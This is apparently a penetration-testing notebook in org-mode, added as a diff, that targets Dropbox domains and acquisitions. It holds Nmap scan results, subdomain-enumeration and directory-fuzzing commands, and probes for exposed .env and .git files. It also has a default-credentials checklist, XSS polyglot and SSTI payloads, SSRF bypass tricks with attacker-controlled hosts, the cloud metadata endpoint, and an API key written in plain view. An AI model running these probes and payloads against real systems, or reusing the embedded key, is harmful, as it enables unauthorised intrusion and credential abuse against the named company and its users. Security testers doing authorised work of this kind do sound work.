+| ssl-cert: Subject: commonName=dropboxforum.com/organizationName=Dropbox, Inc/stateOrProvinceName=California/countryName=US
+| Subject Alternative Name: DNS:dropboxforum.com, DNS:dropboxforums.com, DNS:www.dropboxforums.com, DNS:forum.dropbox.com, DNS:forums.dropbox.com
+| Not valid before: 2023-01-31T00:00:00
+|_Not valid after:  2024-02-13T23:59:59
+|_http-title: Did not follow redirect to https://www.dropboxforum.com/
+
+Nmap scan report for docsend.com (52.84.125.38)
+Host is up (0.15s latency).
+Other addresses for docsend.com (not scanned): 52.84.125.59 52.84.125.62 52.84.125.67
+rDNS record for 52.84.125.38: server-52-84-125-38.ord53.r.cloudfront.net
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Amazon CloudFront httpd
+|_http-server-header: CloudFront
+|_http-title: Did not follow redirect to https://docsend.com/
+443/tcp open  ssl/http Amazon CloudFront httpd
+| ssl-cert: Subject: commonName=*.docsend.com
+| Subject Alternative Name: DNS:*.docsend.com, DNS:docsend.com
+| Not valid before: 2023-08-23T00:00:00
+|_Not valid after:  2024-09-22T23:59:59
+|_http-title: ERROR: The request could not be satisfied
+|_http-server-header: CloudFront
+
+Nmap scan report for dropboxer.net (162.125.248.21)
+Host is up (0.085s latency).
+Other addresses for dropboxer.net (not scanned): 2620:100:6040:21::a27d:f815
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE   VERSION
+80/tcp  open  http      envoy
+|_http-server-header: envoy
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 426 Upgrade Required
+|     content-length: 1005
+|     content-type: text/html
+|     date: Fri, 01 Dec 2023 05:12:12 GMT
+|     server: envoy
+|     connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 426</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 426"/>
+|     </div>
+|     <div id="errorbox">
+|     <h1>Error (426)</h1>Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified. Check out our <a href="https://status.dropbox.com">Status
+|   HTTPOptions: 
+|     HTTP/1.1 426 Upgrade Required
+|     content-length: 1005
+|     content-type: text/html
+|     date: Fri, 01 Dec 2023 05:12:14 GMT
+|     server: envoy
+|     connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 426</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 426"/>
+|     </div>
+|     <div id="errorbox">
+|_    <h1>Error (426)</h1>Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified. Check out our <a href="https://status.dropbox.com">Status
+|_http-title: Did not follow redirect to https://dropboxer.net/
+443/tcp open  ssl/https envoy
+|_http-server-header: envoy
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 1005
+|     Content-Type: text/html
+|     X-Dropbox-Response-Origin: local
+|     Date: Fri, 01 Dec 2023 05:12:19 GMT
+|     Server: envoy
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 400</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 400"/>
+|     </div>
+|     <div id="errorbox">
+|     <h1>Error (400)</h1>Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified. Check out our <a href="https:
+|   HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 1005
+|     Content-Type: text/html
+|     X-Dropbox-Response-Origin: local
+|     Date: Fri, 01 Dec 2023 05:12:20 GMT
+|     Server: envoy
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 400</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 400"/>
+|     </div>
+|     <div id="errorbox">
+|_    <h1>Error (400)</h1>Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified. Check out our <a href="https:
+|_http-title: Did not follow redirect to https://app.dropboxer.net/
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=*.dropboxer.net/organizationName=Dropbox, Inc/stateOrProvinceName=California/countryName=US
+| Subject Alternative Name: DNS:*.dropboxer.net, DNS:dropboxer.net
+| Not valid before: 2023-10-10T00:00:00
+|_Not valid after:  2024-11-09T23:59:59
+|_ssl-date: 2023-12-01T05:13:32+00:00; -1s from scanner time.
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94%I=7%D=12/1%Time=65696B2E%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,484,"HTTP/1\.1\x20426\x20Upgrade\x20Required\r\ncontent-length:\
+SF:x201005\r\ncontent-type:\x20text/html\r\ndate:\x20Fri,\x2001\x20Dec\x20
+SF:2023\x2005:12:12\x20GMT\r\nserver:\x20envoy\r\nconnection:\x20close\r\n
+SF:\r\n<!DOCTYPE\x20html>\n<html>\n<head><meta\x20http-equiv=\"Content-Typ
+SF:e\"\x20content=\"text/html;\x20charset=utf-8\">\n<meta\x20name=\"viewpo
+SF:rt\"\x20content=\"width=device-width,\x20initial-scale=1\"\x20/>\n<titl
+SF:e>Dropbox\x20-\x20426</title>\n<link\x20href=\"https://cfl\.dropboxstat
+SF:ic\.com/static/metaserver/static/css/error\.css\"\x20rel=\"stylesheet\"
+SF:\x20type=\"text/css\"/>\n<link\x20rel=\"shortcut\x20icon\"\x20href=\"ht
+SF:tps://cfl\.dropboxstatic\.com/static/images/favicon\.ico\"/>\n</head>\n
+SF:<body>\n<div\x20class=\"figure\">\n<img\x20src=\"https://assets\.dropbo
+SF:x\.com/www/en-us/illustrations/spot/target-miss\.svg\"\x20alt=\"Error:\
+SF:x20426\"/>\n</div>\n<div\x20id=\"errorbox\">\n<h1>Error\x20\(426\)</h1>
+SF:Something\x20went\x20wrong\.\x20Don't\x20worry,\x20your\x20files\x20are
+SF:\x20still\x20safe\x20and\x20the\x20Dropbox\x20team\x20has\x20been\x20no
+SF:tified\.\x20Check\x20out\x20our\x20<a\x20href=\"https://status\.dropbox
+SF:\.com\">Status\x20")%r(HTTPOptions,484,"HTTP/1\.1\x20426\x20Upgrade\x20
+SF:Required\r\ncontent-length:\x201005\r\ncontent-type:\x20text/html\r\nda
+SF:te:\x20Fri,\x2001\x20Dec\x202023\x2005:12:14\x20GMT\r\nserver:\x20envoy
+SF:\r\nconnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head><meta
+SF:\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=utf-
+SF:8\">\n<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20in
+SF:itial-scale=1\"\x20/>\n<title>Dropbox\x20-\x20426</title>\n<link\x20hre
+SF:f=\"https://cfl\.dropboxstatic\.com/static/metaserver/static/css/error\
+SF:.css\"\x20rel=\"stylesheet\"\x20type=\"text/css\"/>\n<link\x20rel=\"sho
+SF:rtcut\x20icon\"\x20href=\"https://cfl\.dropboxstatic\.com/static/images
+SF:/favicon\.ico\"/>\n</head>\n<body>\n<div\x20class=\"figure\">\n<img\x20
+SF:src=\"https://assets\.dropbox\.com/www/en-us/illustrations/spot/target-
+SF:miss\.svg\"\x20alt=\"Error:\x20426\"/>\n</div>\n<div\x20id=\"errorbox\"
+SF:>\n<h1>Error\x20\(426\)</h1>Something\x20went\x20wrong\.\x20Don't\x20wo
+SF:rry,\x20your\x20files\x20are\x20still\x20safe\x20and\x20the\x20Dropbox\
+SF:x20team\x20has\x20been\x20notified\.\x20Check\x20out\x20our\x20<a\x20hr
+SF:ef=\"https://status\.dropbox\.com\">Status\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port443-TCP:V=7.94%T=SSL%I=7%D=12/1%Time=65696B34%P=x86_64-pc-linux-gnu
+SF:%r(GetRequest,4A1,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x201005\r\nContent-Type:\x20text/html\r\nX-Dropbox-Response-Origin:\x
+SF:20local\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x2005:12:19\x20GMT\r\nSer
+SF:ver:\x20envoy\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>
+SF:\n<head><meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x2
+SF:0charset=utf-8\">\n<meta\x20name=\"viewport\"\x20content=\"width=device
+SF:-width,\x20initial-scale=1\"\x20/>\n<title>Dropbox\x20-\x20400</title>\
+SF:n<link\x20href=\"https://cfl\.dropboxstatic\.com/static/metaserver/stat
+SF:ic/css/error\.css\"\x20rel=\"stylesheet\"\x20type=\"text/css\"/>\n<link
+SF:\x20rel=\"shortcut\x20icon\"\x20href=\"https://cfl\.dropboxstatic\.com/
+SF:static/images/favicon\.ico\"/>\n</head>\n<body>\n<div\x20class=\"figure
+SF:\">\n<img\x20src=\"https://assets\.dropbox\.com/www/en-us/illustrations
+SF:/spot/target-miss\.svg\"\x20alt=\"Error:\x20400\"/>\n</div>\n<div\x20id
+SF:=\"errorbox\">\n<h1>Error\x20\(400\)</h1>Something\x20went\x20wrong\.\x
+SF:20Don't\x20worry,\x20your\x20files\x20are\x20still\x20safe\x20and\x20th
+SF:e\x20Dropbox\x20team\x20has\x20been\x20notified\.\x20Check\x20out\x20ou
+SF:r\x20<a\x20href=\"https:")%r(HTTPOptions,4A1,"HTTP/1\.0\x20400\x20Bad\x
+SF:20Request\r\nContent-Length:\x201005\r\nContent-Type:\x20text/html\r\nX
+SF:-Dropbox-Response-Origin:\x20local\r\nDate:\x20Fri,\x2001\x20Dec\x20202
+SF:3\x2005:12:20\x20GMT\r\nServer:\x20envoy\r\nConnection:\x20close\r\n\r\
+SF:n<!DOCTYPE\x20html>\n<html>\n<head><meta\x20http-equiv=\"Content-Type\"
+SF:\x20content=\"text/html;\x20charset=utf-8\">\n<meta\x20name=\"viewport\
+SF:"\x20content=\"width=device-width,\x20initial-scale=1\"\x20/>\n<title>D
+SF:ropbox\x20-\x20400</title>\n<link\x20href=\"https://cfl\.dropboxstatic\
+SF:.com/static/metaserver/static/css/error\.css\"\x20rel=\"stylesheet\"\x2
+SF:0type=\"text/css\"/>\n<link\x20rel=\"shortcut\x20icon\"\x20href=\"https
+SF:://cfl\.dropboxstatic\.com/static/images/favicon\.ico\"/>\n</head>\n<bo
+SF:dy>\n<div\x20class=\"figure\">\n<img\x20src=\"https://assets\.dropbox\.
+SF:com/www/en-us/illustrations/spot/target-miss\.svg\"\x20alt=\"Error:\x20
+SF:400\"/>\n</div>\n<div\x20id=\"errorbox\">\n<h1>Error\x20\(400\)</h1>Som
+SF:ething\x20went\x20wrong\.\x20Don't\x20worry,\x20your\x20files\x20are\x2
+SF:0still\x20safe\x20and\x20the\x20Dropbox\x20team\x20has\x20been\x20notif
+SF:ied\.\x20Check\x20out\x20our\x20<a\x20href=\"https:");
+
+Host script results:
+|_clock-skew: -1s
+
+Post-scan script results:
+| clock-skew: 
+|   -1s: 
+|     162.125.248.21 (dropboxer.net)
+|_    162.125.248.18 (dropbox.com)
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 7 IP addresses (7 hosts up) scanned in 150.90 seconds
+#+end_example
+
+*** TODO Naabu ASN port scan :active::ports:
+
+
+
+** TODO Sub domains [0/6]
+
+*** TODO Amass
+
+#+begin_src sh :async :var tbl= :results output replace
+file="targets.txt"
+if [ -e "$file" ]; then
+    while IFS= read -r line; do
+        amass enum -rf ~/wordlists/resolvers/resolvers.txt -d "$line" -ip -active
+    done < "$file"
+else
+    echo "File $file not found."
+fi
+#+end_src
+*** TODO Hackmode
+#+NAME: hackmode-subfinder
+#+begin_src lisp :session hackmode :results output-replace :file "hackmode-subfinder.txt"
+(defun bulk-subfinder (lst)
+  (remove-duplicates (hackmode:flatten (lparallel:pmap 'list (lambda (domain)
+                                                               (hackmode:domain-name (recon.dns:subfinder* "-d" domain))) lst))))
+(setq *subfinder-results* (bulk-subfinder *scope*))
+(loop for domain in *subfinder-results*
+      do (push domain *domains*)
+      do (format t "~a~%" domain))
+#+end_src
+
+#+begin_src shell :async t
+cat hackmoder-subfinder.txt | anewer subdomains.txt
+#+end_src
+
+
+*** TODO Subfinder
+Subfinder here may or may not find stuff
+
+#+begin_src sh :async
+subfinder -dl targets.txt -o subfinder.txt
+#+end_src
+
+#+begin_src shell :async t
+cat subfinder.txt | anewer subdomains.txt
+#+end_src
+
+
+
+
+*** TODO Dorking
+*** TODO Nmap on found subdomains
+
+#+begin_src sh :async :results output replace
+nmap -A -iL subdomains.txt
+#+end_src
+*** TODO Github subdomains
+#+begin_src shell :async t
+while IFS= read -r domain; do github-subdomains -o "github-subdomains.txt" -t .tokens -d "$domain"; done < subdomains.txt
+#+end_src
+
+#+RESULTS:
+: 37a5af039af44a52d55515b506ab4c25
+
+** TODO Osint [3/3]
+Start maltego
+#+begin_src sh :async t :results none
+maltego
+#+end_src
+
++ [X] Aleph
++ [X] OCCRP
++ [X] Chunkbase
+
+*** DONE Acquisitions
+| org-title       | org-url                                                 |                                                      |            |
+| FormSwift       | https://www.crunchbase.com/organization/FormSwift       |                                                      |            |
+| Secomba GmbH    | Boxcryptor                                              | https://www.crunchbase.com/organization/Secomba GmbH | Boxcryptor |
+| Dropbox DocSend | https://www.crunchbase.com/organization/Dropbox DocSend |                                                      |            |
+| HelloSign       | https://www.crunchbase.com/organization/HelloSign       |                                                      |            |
+| Verst           | https://www.crunchbase.com/organization/Verst           |                                                      |            |
+| Sparks          | https://www.crunchbase.com/organization/Sparks          |                                                      |            |
+| Clementine      | https://www.crunchbase.com/organization/Clementine      |                                                      |            |
+| Umano           | https://www.crunchbase.com/organization/Umano           |                                                      |            |
+| Pixelapse       | https://www.crunchbase.com/organization/Pixelapse       |                                                      |            |
+| CloudOn         | https://www.crunchbase.com/organization/CloudOn         |                                                      |            |
+
+
+* Tech Workers
+*** Tech stack
+**** uppy
+https://github.com/transloadit/uppy/issues
+unconfirmed
+*** TODO Software versions
+*** TODO Github [0/3]
+**** TODO Make List of public repos
+#+NAME: FOSS-REPOS
+| org     | link                                                  |
+| Dropbox | https://github.com/dropbox/image-search               |
+| Dropbox | https://github.com/dropbox/zxcvbn                     |
+| Dropbox | https://github.com/dropbox/nautilus-dropbox           |
+| Dropbox | https://github.com/dropbox/python-zxcvbn              |
+| Dropbox | https://github.com/dropbox/pygerduty                  |
+| Dropbox | https://github.com/dropbox/pyxl                       |
+| Dropbox | https://github.com/dropbox/librsync                   |
+| Dropbox | https://github.com/dropbox/dropbox-sdk-java           |
+| Dropbox | https://github.com/dropbox/othw                       |
+| Dropbox | https://github.com/dropbox/json11                     |
+| Dropbox | https://github.com/dropbox/hydra                      |
+| Dropbox | https://github.com/dropbox/dropbox-ios-dropins-sdk    |
+| Dropbox | https://github.com/dropbox/emmer                      |
+| Dropbox | https://github.com/dropbox/changes                    |
+| Dropbox | https://github.com/dropbox/pem-converter-maven-plugin |
+| Dropbox | https://github.com/dropbox/questions                  |
+| Dropbox | https://github.com/dropbox/amqp-coffee                |
+| Dropbox | https://github.com/dropbox/phabricator-changes        |
+| Dropbox | https://github.com/dropbox/PyHive                     |
+| Dropbox | https://github.com/dropbox/zxcvbn-ios                 |
+| Dropbox | https://github.com/dropbox/puppet-osx_ard             |
+| Dropbox | https://github.com/dropbox/puppet-osx_utils           |
+| Dropbox | https://github.com/dropbox/oid_translate              |
+| Dropbox | https://github.com/dropbox/trapperkeeper              |
+| Dropbox | https://github.com/dropbox/miniutf                    |
+| Dropbox | https://github.com/dropbox/encfs                      |
+| Dropbox | https://github.com/dropbox/pytest-call-tracer         |
+| Dropbox | https://github.com/dropbox/mdwebhook                  |
+| Dropbox | https://github.com/dropbox/dropbox_hook               |
+| Dropbox | https://github.com/dropbox/phabricator-sentry         |
+
+**** TODO User listing
+This is related to tech workers but this time going into detail of their github accounts.
+**** TODO Truffel APi
+
+
+
+
+** TODO Find api urls
+** TODO Ffuf Dir search
+
+#+NAME: dirbust-config
+#+begin_src conf
+[http]
+    recursion=true
+[general]
+    threads = 24
+
+#+end_src
+
+#+BEGIN_SRC ffuf :wordlist-files '("~/wordlists/Discovery/Web-Content/big.txt:FUZZ" "./targets.txt:HOST") :config-block dirbust-config
+GET http://HOST/FUZZ HTTP/1.1
+Host: HOST
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+** TODO [#A] Easy Freebies [0/2]
+*** TODO Exposed git/json/env?
+config.json?
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/config.json HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+.env?
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/.env HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+.git/config?
+
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/.git/config HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+
+git head?
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/.git/HEAD HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+*** TODO Leakix
+
+
+
+
+* TODO Content Discovery [0/6 ] :discovery::recon:
+** TODO FFUF
+Use ffuf to find content and dirs
+** TODO Wayback machine
+** TODO robots.txt and sitemap
+** TODO Google Dorking
+** TODO Common Crawl
+** TODO Sipder crawling :apex:
+Also look for apex domains
+
+* TODO Security_Misconfiguration [0/4]
++ [ ] https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+
++ [ ] Look online for default creds (use them)
+
++ [ ] Note default from docuementation
+
++ [ ] Check for stack traces
+
+
+* TODO Vunerable Components [0/2]
+
++ it is very likly that unless they are not 100% aware of all the components they use server side and client.
++ [ ] Search Github/online for kwnown cves of the version
++ [ ] Search for its deps?
+
+
+
+* TODO XSS [0/4]
++ Roam: [[id:524a19f0-d6e9-4785-9f8d-262495410c08][XSS]]
++ https://github.com/wisec/domxsswiki/wiki/
++ http://www.webappsec.org/projects/articles/071105.html
+Core Idea: Does the page functionality display something to the users? For time sensitive testing the 80/20 rule applies. Many testers use Polyglot payloads. You probably have too!
+** TODO *Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)
+#+begin_src html
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+
+#+end_src
+** TODO Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research)
+#+begin_src html
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="https ://www.memeatlas.com/images/misc/arnold-true-lies-mask.jpg">
+
+#+end_src
+** TODO Multi-context polyglot payload (Mathias Karlsson)
+#+begin_src html
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+
+#+end_src
+** Jhaddix's observations
+Input Vectors:
+- Customizable Themes & Profiles via CSS
+- Event or meeting names
+- URI based
+- Imported from a 3rd party (think Facebook integration)
+- JSON POST Values (check returning content type)
+- File Upload names
+- Uploaded files (swf, HTML, ++)
+- Custom Error pages
+- fake params - ?realparam=1&foo=bar’+alert(/XSS/)+’
+- Login and Forgot password forms
+
+Common Params:
+onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page)
+
+** Payloads
+
+#+begin_example
+\%22})))}catch(e){alert(document.domain);}//
+"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
+"a")(({type:"ready"}));}catch(e){alert(1)}//
+#+end_example
+
+
+* TODO [#A] SQLI [0/5]
++ [ ] Roam: [[id:81d62666-4ce8-4244-b498-739a680f9673][SQL Injection]]
++ [ ] Roam: [[id:ef03bc97-55a3-44e6-b24a-523630f0090d][SQLMap]]
++ [ ] Use tampers to get around blacklists
++ [ ] SqliPy can be used to script it
++ [ ] Error based is unlikly to occur.
+
+* TODO GraphQL
++ Roam: [[id:25fc721e-5b9f-466f-b1d6-73a0db092853][GraphQl]]
++ https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
+** Payloads
+
+Introspection
+#+begin_src graphql
+query IntrospectionQuery {
+  __schema {
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+    subscriptionType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+#+end_src
+
+* TODO SSTI [0/0]
++ Roam: [[id:04f89216-71ef-4627-91c6-138e7c3cc533][SSTI]]
+
+** TODO tools [/]
+- https://github.com/epinna/tplmap.git
+** TODO Payloads
+Common payloads
+#+begin_example
+a{{bar}}b
+a{{7*7}}
+{var} ${var} {{var}} <%var%> [% var %]
+#+end_example
+
+
+* TODO CSRF
++ Roam: [[id:4312a6c1-a0e8-42b3-8f63-16de99ec3f39][Cross Site request forgery]]
+
+
+
+* TODO SSRF
++ Roam: [[id:7fbb6131-0ea0-4863-a55c-6a4fd364e522][SSRF]]
++ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
++ https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
++ https://portswigger.net/web-security/ssrf
+
+ | Url                                                                                                                                  | method | tags | notes | other |
+ |--------------------------------------------------------------------------------------------------------------------------------------+--------+------+-------+-------|
+ | https://www.dropbox.com/pithos/host:app.hellosign.com/marketing_tracker_client,ux_analytics,hellosign_marketing_utils,privacy_consen | get    |      |       |       |
+
+
+#+DOWNLOADED: screenshot @ 2023-11-07 09:36:30
+[[file:SSRF/2023-11-07_09-36-30_screenshot.png]]
+
+** TODO [#A] File Descriptors
+This is usful in clouds or chared hosting, remeber the remote htop fuzzer!
+if it is a interpeted env, try and use their wrapper
+
++ fd:// for php
+
+** TODO common bypasses  [0/4]
++ [ ] Use and altnertive IP representation of 127.0.0.1, 2130706433, 017700000001, or 127.1.
++ [ ] Use your own domain, spoofed.burpcollaborator.net also works
++ [ ] Obfuscate blocked strings using URL encoding or case variation.
+
++ [ ]  Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.
+
+** TODO Whitelisted bypasses [0/6]
++ [ ] You can embed credentials in a URL before the hostname, using the @ character. https://expected-host:fakepassword@evil-host
++ [ ] https://evil-host#expected-host
++ [ ] You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host
+
++ [ ] You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
+
+
+
++ [ ] Use all of the above
+
+** TODO Bypass via open redirect
+i have seen something like this before on freshworks.
+Basicly where there is a open redirect bug you can use that Vulnerable endpoint as a payload
+
+example
+#+begin_example
+/path/?api=https://open.redirect
+#+end_example
+#+begin_src http
+POST /data
+
+api=http://example.com/path/?api=https://open.redirect
+#+end_src
+
+** TODO [#A] Get instance metadata
+Get the instance metadata
+#+begin_example
+http://169.254.169.254/
+#+end_example
+* API
+#+NAME: jwt
+#+begin_src sh :results output replace :async :var api_id="cta4IiIytVd0aqhk" :var key="YjmVwsHJCc5BkeXmJALeCTJymlgcQnBIm9iJc5hX"
+curl -X GET https://api.helloworks.com/v3/token/$api_id \
+     -H "Authorization: Bearer $key" | jq '.data["token"]'
+#+end_src
+
+#+RESULTS: jwt
+: 00cccee35482fed54410c7701afcaf8f
+
+
+
+#+begin_src sh :async :results output replace :var JTW=jwt
+echo $JWT
+#+end_src
+
+#+RESULTS:
+: 939db2759c1a3c0a9a8d4d608359859a
+
+#+begin_src sh :async :results output replace :var JTW=jwt
+curl -X POST https://api.helloworks.com/v3/workflow_instances \
+  -H "Authorization: Bearer $jwt" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "workflow_id=MqopNGSRc01HTGeN" \
+  --data-urlencode "participants[id_cwVOxYCxkPIw7t7Q][type]=<email | phone>" \
+  --data-urlencode "participants[id_cwVOxYCxkPIw7t7Q][value]=<email@example.com | 2125551212>" \
+  --data-urlencode "participants[id_cwVOxYCxkPIw7t7Q][full_name]=<Full Name>" \
+  --data-urlencode "callback_url=<Optional_callback_URL>" \
+  --data-urlencode "redirect_url=<Optional_redirect_URL>" \
+#+end_src
+
+#+RESULTS:
+: 14bc8d8a10788381052e3187c923bd1f
